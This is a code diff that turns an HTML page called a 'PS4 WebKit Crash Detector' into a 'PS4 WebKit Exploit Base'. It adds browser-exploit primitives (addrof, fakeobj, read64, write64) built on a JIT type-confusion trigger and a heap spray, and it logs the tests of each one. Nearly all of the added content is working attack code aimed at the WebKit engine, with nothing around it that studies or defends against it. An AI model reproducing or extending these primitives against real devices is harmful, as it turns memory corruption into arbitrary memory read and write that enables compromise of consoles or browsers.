@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>🎮 PS4 WebKit Crash Detector</title>
+  <title>🎮 PS4 WebKit Exploit Base</title>
   <style>
     body {
       background: black;
@@ -18,7 +18,7 @@
   </style>
 </head>
 <body>
-  <h2>PS4 WebKit Crash Detector</h2>
+  <h2>PS4 WebKit Exploit Base</h2>
   <div id="log">[+] Starting...</div>
 
   <script>
@@ -29,7 +29,7 @@
     window.addEventListener("load", () => {
       log("[+] Page loaded.");
 
-      const PATTERN   = 0x43434343; // ASCII 'CCCC'
+      const PATTERN = 0x43434343; // ASCII 'CCCC'
       const SPRAY_CNT = 50000;
       const SPRAY_LEN = 16;
 
@@ -60,6 +60,7 @@
 
       // Try to corrupt index 3
       const TRIGGER_IDX = 3;
+
       try {
         opt(victim, TRIGGER_IDX, 13.37);
       } catch (e) {
@@ -69,34 +70,95 @@
       // Check if victim was corrupted
       log(`[?] Victim[${TRIGGER_IDX}] = ${victim[TRIGGER_IDX]}`);
 
-      // Try to detect leaked pointers from sprayed arrays
+      // Detect heap overwrites
+      log("[*] Scanning heap...");
       for (let i = 0; i < 100; i++) {
         const u32 = spray[i].u32;
         for (let j = 0; j < u32.length; j++) {
           if (u32[j] !== PATTERN) {
-            log(`[*] Corruption detected in spray[${i}].u32[${j}] = 0x${u32[j].toString(16)}`);
+            log(`[*] Corruption in spray[${i}].u32[${j}] = 0x${u32[j].toString(16)}`);
           }
         }
       }
 
-      // Try to build basic primitives
-      log("[+] Trying addrof/fakeobj...");
-      try {
-        const obj = { x: 1 };
-        victim[3] = obj;
+      // Build addrof(obj)
+      function addrof(obj) {
+        opt(victim, TRIGGER_IDX, obj); // Write object
+        return floatToU64(victim[TRIGGER_IDX]); // Read back as pointer
+      }
 
-        // Force corruption
-        opt(victim, TRIGGER_IDX, {});
-        const leaked = victim[TRIGGER_IDX];
+      // Build fakeobj(addr)
+      function fakeobj(addr) {
+        let buffer = new ArrayBuffer(8);
+        let f64 = new Float64Array(buffer);
+        let u64 = new BigUint64Array(buffer);
+        u64[0] = addr;
+        opt(victim, TRIGGER_IDX, f64[0]);
+        return victim[TRIGGER_IDX];
+      }
 
-        log(`[?] Leaked value: ${leaked}`);
-        if (typeof leaked === "object" && leaked !== null) {
-          log("[+] Possible pointer leak!");
-        } else {
-          log("[-] No leak detected yet.");
+      // Utility: Convert float to u64
+      function floatToU64(val) {
+        let buffer = new ArrayBuffer(8);
+        let f64 = new Float64Array(buffer);
+        let u64 = new BigUint64Array(buffer);
+        f64[0] = val;
+        return u64[0];
+      }
+
+      // Utility: Convert u64 to float
+      function u64ToFloat(val) {
+        let buffer = new ArrayBuffer(8);
+        let f64 = new Float64Array(buffer);
+        let u64 = new BigUint64Array(buffer);
+        u64[0] = val;
+        return f64[0];
+      }
+
+      // Test addrof()
+      log("[+] Testing addrof(obj)");
+      let testObj = { secret: "flag{exploit_in_progress}" };
+      let objAddr = addrof(testObj);
+      log(`[+] addrof(testObj) = 0x${objAddr.toString(16)}`);
+
+      // Test fakeobj()
+      log("[+] Testing fakeobj()");
+      let fake = fakeobj(objAddr);
+      if (typeof fake === "object" && fake !== null) {
+        log("[+] fakeobj() returned an object!");
+      } else {
+        log("[-] fakeobj() failed");
+      }
+
+      // Build read64(addr)
+      function read64(addr) {
+        let fake_arr = fakeobj(addr);
+        if (!(fake_arr instanceof Float64Array)) {
+          log("[-] fakeobj() failed in read64");
+          return 0n;
         }
-      } catch (e) {
-        log(`[!] Exception in leak test: ${e.message}`);
+        return floatToU64(fake_arr[0]);
+      }
+
+      // Build write64(addr, value)
+      function write64(addr, value) {
+        let fake_arr = fakeobj(addr);
+        if (!(fake_arr instanceof Float64Array)) {
+          log("[-] fakeobj() failed in write64");
+          return;
+        }
+        let buffer = new ArrayBuffer(8);
+        let f64 = new Float64Array(buffer);
+        let u64 = new BigUint64Array(buffer);
+        u64[0] = value;
+        fake_arr[0] = f64[0];
+      }
+
+      // Test read64()
+      if (objAddr > 0n) {
+        log("[+] Testing read64()");
+        let leakedValue = read64(objAddr);
+        log(`[+] read64(objAddr) = 0x${leakedValue.toString(16)}`);
       }
 
       log("[+] Done.");
